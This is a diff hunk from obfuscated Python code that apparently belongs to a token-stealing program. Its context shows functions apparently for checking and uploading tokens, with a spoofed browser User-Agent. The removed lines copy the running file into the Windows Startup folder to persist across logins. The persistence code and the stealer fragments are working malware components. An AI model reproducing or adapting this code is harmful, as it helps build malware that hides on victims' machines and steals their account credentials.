@@ -211,17 +211,6 @@ def ch1ckT4k1n (OO0OO0OOOO0OOO0O0 ):#line:292
         return True #line:300
     except :#line:301
         return False #line:302
-if getattr (sys ,'frozen',False ):#line:304
-    currentFilePath =os .path .dirname (sys .executable )#line:305
-else :#line:306
-    currentFilePath =os .path .dirname (os .path .abspath (__file__ ))#line:307
-fileName =os .path .basename (sys .argv [0 ])#line:309
-filePath =os .path .join (currentFilePath ,fileName )#line:310
-startupFolderPath =os .path .join (os .path .expanduser ('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')#line:312
-startupFilePath =os .path .join (startupFolderPath ,fileName )#line:313
-if os .path .abspath (filePath ).lower ()!=os .path .abspath (startupFilePath ).lower ():#line:315
-    with open (filePath ,'rb')as src_file ,open (startupFilePath ,'wb')as dst_file :#line:316
-        shutil .copyfileobj (src_file ,dst_file )#line:317
 def upl05dT4k31 (OOO0OOO000000OOOO ,OOOOOO0O000O00O0O ):#line:320
     global IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO #line:321
     O000O0O0000OOOO00 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:325
